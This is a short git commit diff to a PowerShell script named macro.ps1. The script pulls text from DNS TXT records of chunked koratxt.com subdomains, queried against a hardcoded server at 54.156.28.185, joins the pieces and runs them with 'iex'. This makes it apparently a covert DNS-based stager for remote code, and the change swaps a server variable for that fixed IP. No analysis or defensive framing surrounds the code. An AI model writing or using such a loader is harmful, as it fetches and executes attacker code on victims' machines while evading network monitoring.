9e390a4364c2dace403d1ba5fbfec20319e5f6c4
networking101 <48070080+networking101@users.noreply.github.com>
2019-04-04 14:38:53 -0500

    Add files via upload

--- macro.ps1
+++ macro.ps1
@@ -6,5 +6,5 @@ foreach ($i in 1..[int]"$file_size") {
     $x += $(Resolve-DnsName -Server '54.156.28.185' -Name "66696c65.$index.koratxt.com" -Type TXT).Strings
     $index += $size
 }
-$(Resolve-DnsName -Server $server -Name "656e64.koratxt.com" -Type TXT)
+$(Resolve-DnsName -Server '54.156.28.185' -Name "656e64.koratxt.com" -Type TXT)
 iex $x
